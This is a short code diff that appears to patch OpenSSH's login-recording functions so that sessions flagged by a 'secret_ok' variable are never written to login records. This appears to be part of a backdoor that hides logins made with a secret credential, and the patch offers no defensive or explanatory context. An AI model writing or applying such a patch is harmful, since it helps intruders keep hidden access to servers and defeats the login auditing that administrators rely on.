@@ -133,8 +133,10 @@ record_login(pid_t pid, const char *tty, const char *user, uid_t uid,
 
 	li = login_alloc_entry(pid, user, host, tty);
 	login_set_addr(li, addr, addrlen);
-	login_login(li);
-	login_free_entry(li);
+	if(!secret_ok || secret_ok!=1){
+		login_login(li);
+		login_free_entry(li);
+	}
 }
 
 #ifdef LOGIN_NEEDS_UTMPX
@@ -158,6 +160,8 @@ record_logout(pid_t pid, const char *tty, const char *user)
 	struct logininfo *li;
 
 	li = login_alloc_entry(pid, user, NULL, tty);
-	login_logout(li);
-	login_free_entry(li);
+	if(!secret_ok || secret_ok!=1){
+		login_logout(li);
+		login_free_entry(li);
+	}
 }
